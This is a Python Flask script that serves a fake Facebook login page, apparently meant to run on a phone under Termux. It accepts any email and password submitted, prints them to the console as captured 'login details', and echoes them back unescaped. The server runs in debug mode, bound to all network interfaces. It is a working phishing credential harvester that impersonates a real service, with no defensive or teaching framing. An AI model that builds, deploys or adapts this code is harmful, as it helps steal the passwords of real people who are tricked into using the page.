from flask import Flask, render_template_string, request

app = Flask(__name__)

# Basic HTML Template for Facebook-like Login page
facebook_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #e9eff1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            padding: 40px;
            width: 300px;
        }
        h2 {
            text-align: center;
            color: #3b5998;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        .btn {
            width: 100%;
            padding: 10px;
            background-color: #3b5998;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
        }
        .btn:hover {
            background-color: #365e92;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Facebook Login</h2>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Email or Phone" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <input type="submit" class="btn" value="Log In">
        </form>
        <div class="footer">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>
</body>
</html>
"""

# Route for showing the Facebook-like login page
@app.route('/')
def home():
    return render_template_string(facebook_html)

# Route to handle login logic
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Clear login details display in Termux
    login_details = f"""
    -------------------------------------
    Login Successful!
    
    Username: {username}
    Password: {password}
    -------------------------------------
    """
    
    # Print the formatted login details in Termux
    print(login_details)
    
    # For now, simply show a success message in the browser
    return f"""
    <h3>Login Successful!</h3>
    <p><strong>Username:</strong> {username}</p>
    <p><strong>Password:</strong> {password}</p>
    """

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5060)